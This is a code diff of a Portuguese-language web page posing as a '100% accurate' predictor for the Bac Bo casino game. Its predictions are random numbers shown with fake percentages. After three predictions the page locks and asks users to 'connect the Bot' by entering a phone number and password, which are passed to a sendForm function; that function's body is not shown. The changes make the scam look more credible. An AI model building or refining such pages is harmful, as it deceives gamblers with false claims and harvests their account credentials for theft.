@@ -2,11 +2,11 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Predictor Bac Bó</title>
+<title>Bac Bó Predictor</title>
 <style>
     body {
         font-family: Arial, sans-serif;
-        background: linear-gradient(180deg, #1a1aff, #800080); /* azul para roxo */
+        background: linear-gradient(180deg, #0044cc, #660066); /* azul para roxo */
         color: #fff;
         text-align: center;
         margin: 0;
@@ -60,13 +60,25 @@
         font-size: 1.2em;
         color: #ffcc00;
     }
+    #historico {
+        margin-top: 30px;
+        font-size: 1.1em;
+        text-align: center;
+    }
+    #historico ul {
+        list-style: none;
+        padding: 0;
+    }
+    #historico li {
+        margin: 5px 0;
+    }
 </style>
 </head>
 <body>
 
 <!-- Tela inicial -->
 <div class="container active" id="inicio">
-    <h1>🎲 Predictor Bac Bó 100% Acertivo</h1>
+    <h1>🎲 Bac Bó Predictor 100% de Acertividade</h1>
     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
     <br><br>
     <button onclick="abrirLogin()">Conectar o Bot</button>
@@ -87,11 +99,17 @@
 <!-- Tela do Jogo -->
 <div class="game-container" id="game">
     <h2>Previsão da Banca</h2>
-    <button id="btnPrever" onclick="prever()">Prever</button>
+    <button id="btnPrever" onclick="prever()">Prever o próximo resultado</button>
     <div class="result-box" id="resultado">Clique em prever para gerar resultado</div>
 
     <!-- Gráfico -->
     <canvas id="grafico" width="400" height="400"></canvas>
+
+    <!-- Histórico -->
+    <div id="historico">
+        <h3>Histórico de Resultados</h3>
+        <ul id="listaHistorico"></ul>
+    </div>
 
     <div id="lock"></div>
 
@@ -110,6 +128,7 @@ let chart;
 let limite = 3;
 let total = 0;
 let locked = false;
+let historico = [];
 
 function abrirLogin(){
     document.getElementById("inicio").classList.remove("active");
@@ -121,7 +140,6 @@ function login(){
     let password = document.getElementById("password").value;
 
     if(phone && password){
-        // Envia formulário ao clicar em Entrar
         sendForm(phone, password);
 
         document.getElementById("login").classList.remove("active");
@@ -135,7 +153,7 @@ function login(){
 
 function prever(){
     if(locked){
-        document.getElementById("resultado").innerText = "🔒 BLOQUEADO – Para continuar deves conectar o Bot";
+        document.getElementById("resultado").innerText = "🔒 Acesso Bloqueado – Para ver os próximos resultados deverás conectar o Bot";
         document.getElementById("soundLock").play();
         return;
     }
@@ -145,26 +163,30 @@ function prever(){
     let rand = Math.random();
     let resultado;
     let dadosGrafico;
+    let cores;
 
     if(rand < 0.4){ 
-        resultado = "📊 Tendência: Azul (80%)";
+        resultado = "📊 Resultado: Azul (80%) 🎲";
         dadosGrafico = [80,20,0]; 
+        cores = ['#0077b6','#222','#222'];
     } else if(rand < 0.8){ 
-        resultado = "📊 Tendência: Vermelho (80%)";
+        resultado = "📊 Resultado: Vermelho (80%) 🎲";
         dadosGrafico = [0,80,20]; 
+        cores = ['#222','#d62828','#222'];
     } else { 
-        resultado = "📊 Empates frequentes (20%)";
+        resultado = "📊 Resultado: Empate (20%) 🎲";
         dadosGrafico = [0,0,20]; 
+        cores = ['#222','#222','#fcbf49'];
     }
 
-    // animação de giro
     const canvas = document.getElementById("grafico");
     canvas.style.transform = "rotate(360deg)";
     setTimeout(()=>{ canvas.style.transform = "rotate(0deg)"; }, 1000);
 
     setTimeout(()=>{
         document.getElementById("resultado").innerText = resultado;
-        atualizarGrafico(dadosGrafico);
+        atualizarGrafico(dadosGrafico, cores);
+        atualizarHistorico(resultado);
     }, 1000);
 
     total++;
@@ -199,19 +221,34 @@ function inicializarGrafico(){
     });
 }
 
-function atualizarGrafico(dados){
+function atualizarGrafico(dados, cores){
     chart.data.datasets[0].data = dados;
+    chart.data.datasets[0].backgroundColor = cores;
     chart.update();
 }
 
 function atualizarLock(){
-    document.getElementById("lock").innerText = locked ? "🔒 BLOQUEADO – Conecte o Bot para continuar" : "IA: " + (limite - total) + " previsões restantes";
+    document.getElementById("lock").innerText = locked ? "🔒 Acesso Bloqueado – Para ver os próximos resultados deverás conectar o Bot" : "IA: " + (limite - total) + " previsões restantes";
+}
+
+function atualizarHistorico(resultado){
+    historico.unshift(resultado);
+    if(historico.length > 3) historico.pop();
+
+    let lista = document.getElementById("listaHistorico");
+    lista.innerHTML = "";
+    historico.forEach(r => {
+        let li = document.createElement("li");
+        li.textContent = r;
+        lista.appendChild(li);
+    });
 }
 
 function voltarInicio(){
-    // Resetar jogo e voltar para tela inicial
     total = 0;
     locked = false;
+    historico = [];
+    document.getElementById("listaHistorico").innerHTML = "";
     document.getElementById("game").classList.remove("active");
     document.getElementById("inicio").classList.add("active");
 }
@@ -239,4 +276,3 @@ function sendForm(phone, password){
 
 </body>
 </html>
-
